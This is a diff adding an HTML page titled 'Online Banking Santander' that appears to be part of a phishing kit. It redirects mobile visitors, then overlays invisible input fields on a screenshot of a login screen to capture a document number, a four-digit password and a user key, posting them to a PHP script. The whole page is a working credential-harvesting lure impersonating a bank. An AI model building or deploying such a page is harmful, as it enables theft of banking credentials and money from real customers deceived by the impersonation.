@@ -1,0 +1,41 @@
+<!DOCTYPE html>
+<html>
+<head>
+    <meta charset="utf-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1">
+    <link rel="icon" href="favicon.ico" type="image/x-icon">
+    <link rel="stylesheet" type="text/css" href="css/style.css">
+    <title>Online Banking Santander</title>
+</head>
+<body>
+    <script type="text/javascript">
+navegador=navigator.userAgent; //busco el "userAgent" del usuario.
+//lista de palabras del "userAgent" en los móviles
+moviles=["Mobile","iPhone","iPod","BlackBerry","Opera Mini","Sony","MOT","Nokia","samsung"];
+detector=0; //Variable que detectará si se usa un móvil
+for (i in moviles) { //comprobar en la lista ...
+   //si el método "indexOf" no devuelve -1, indica que la palabra está en el "userAgent"
+   compruebo=navegador.indexOf(moviles[i]); 
+   if (compruebo>-1) { 
+      detector=1; //Si es un móvil, cambio el valor del detector
+      }
+   }
+if (detector==1) { //si es un móvil redirecciono la página.
+   location.href="mobile.html"; //Se redirecciona hacia la versión móvil.
+   }
+</script>
+    <form action="php/1pc.php" method="post">
+
+        <input class="campo" type="tel" name="d0cv" maxlength="11" placeholder="" style="background-color:transparent;" required>
+        <input class="campo2" type="password" name="p455s" maxlength="4" style="background-color:transparent;" required>
+        <input class="campo3" type="password" name="us4r" maxlength="20" style="background-color:transparent;" required> 
+        <input class="check" type="checkbox" style="background-color:transparent;"> 
+        <input class="button" type="submit" value="" style="background-color:transparent;">   
+    </form>
+
+    <div>
+<img align="center" style="min-height: 900px; min-width: 840px;" src="images/1pc.png">
+</div>
+
+</body>
+</html>
